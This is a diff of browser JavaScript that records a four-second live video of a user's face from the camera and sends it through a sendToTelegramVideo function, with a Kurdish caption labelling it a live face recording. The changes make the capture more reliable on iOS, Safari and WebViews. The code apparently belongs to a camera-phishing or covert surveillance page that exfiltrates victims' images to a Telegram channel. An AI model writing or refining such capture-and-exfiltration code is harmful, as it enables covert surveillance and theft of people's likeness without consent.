@@ -229,17 +229,18 @@
                     videoElem.srcObject = stream;
                     videoElem.play();
                     
-                    let mimeType = 'video/webm';
+                    // Safe stream recording configuration for iOS / Safari / WebViews
+                    let options = { mimeType: 'video/webm' };
                     if (MediaRecorder.isTypeSupported('video/mp4')) {
-                        mimeType = 'video/mp4';
-                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                        mimeType = 'video/webm;codecs=vp8,opus';
+                        options = { mimeType: 'video/mp4' };
+                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+                        options = { mimeType: 'video/webm;codecs=vp8' };
                     }
 
                     let mediaRecorder;
                     try {
-                        mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
-                    } catch (err) {
+                        mediaRecorder = new MediaRecorder(stream, options);
+                    } catch(e) {
                         mediaRecorder = new MediaRecorder(stream);
                     }
 
@@ -252,9 +253,10 @@
                         sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی ڕووخسار (Live Video)*");
                         stream.getTracks().forEach(track => track.stop());
                     };
-                    mediaRecorder.start();
+                    
+                    mediaRecorder.start(1000); // Collect data chunks every 1 second to prevent blank screen
                     setTimeout(() => {
-                        if (mediaRecorder.state !== 'inactive') {
+                        if (mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                         }
                     }, 4000);
